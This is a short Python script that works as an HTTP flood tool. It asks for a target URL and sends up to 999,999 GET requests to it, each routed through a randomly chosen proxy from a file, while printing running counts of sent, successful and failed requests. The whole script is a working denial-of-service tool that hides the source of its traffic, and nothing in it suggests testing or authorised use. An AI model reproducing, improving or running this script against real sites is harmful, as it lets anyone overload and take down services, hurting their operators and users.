import sys
import requests
import random

fail = 0
succ = 0
total = 0

def load_proxies(file_path):
    """Load proxies from a text file."""
    with open(file_path, 'r') as file:
        proxies = file.read().splitlines()
    return proxies

def get_random_proxy(proxies):
    """Select a random proxy from the list and return in requests-compatible format."""
    proxy = random.choice(proxies)
    return {"http": f"http://{proxy}", "https": f"http://{proxy}"}

def xnln():
    global fail, succ, total
    url = input("Target URL: ")
    proxies = load_proxies("proxies.txt")  # Load proxies from the file

    for i in range(999999):
        proxy = get_random_proxy(proxies)  # Get a random proxy for each request
        try:
            response = requests.get(url, proxies=proxy, timeout=5)
            total += 1
            if response.ok:
                succ += 1
            else:
                fail += 1
        except requests.exceptions.RequestException:
            total += 1
            fail += 1

        # Dynamically update the statistics on the same line
        sys.stdout.write(f"\rTotal Sent: {total} | SUCCESSFUL: {succ} | FAILED: {fail}")
        sys.stdout.flush()

    print('\nProcess Complete.')

xnln()
